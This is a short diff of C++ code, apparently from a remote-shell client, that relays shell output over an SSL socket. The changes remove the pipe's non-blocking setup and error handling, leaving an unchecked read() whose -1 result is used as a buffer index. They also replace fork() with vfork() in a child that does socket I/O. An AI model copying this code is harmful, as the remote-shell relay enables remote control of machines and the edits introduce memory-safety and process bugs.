@@ -68,17 +68,18 @@ bool Client::SendInfo(){
 }
 
 void Client::threadReadShell(int& Pipe){
-	fcntl(Pipe, F_SETFL, O_NONBLOCK); //make fd non-block so stop when program exits
+	//fcntl(Pipe, F_SETFL, O_NONBLOCK); //make fd non-block so stop when program exits
 	char cCmdOutput[256];
 	int iRet = 0, iLen = 0;
 	while(isRunningShell){
-		while((iRet = read(Pipe, &cCmdOutput, 255)) == -1){ //sleep until reads data or loop break
+		/*while((iRet = read(Pipe, &cCmdOutput, 255)) == -1){ //sleep until reads data or loop break
 			if(!isRunningShell){
 				break;
 			}
 			usleep(100000);
 			continue;
-		}
+		}*/
+		iRet = read(Pipe, &cCmdOutput, 255);
 		cCmdOutput[iRet] = '\0';
 		iLen = strlen(cCmdOutput);
 		iRet = SSL_write(sslSocket, cCmdOutput, iLen);
@@ -128,7 +129,7 @@ void Client::SpawnShell(const std::string strCommand){
 		}
 		return;
 	}
-	pid_t pP = fork();
+	pid_t pP = vfork();
 	if(pP == 0){ //child running
 		if(SSL_write(sslSocket, CommandCodes::cShellRunning, 3) <= 0){
 			#ifdef _DEBUG
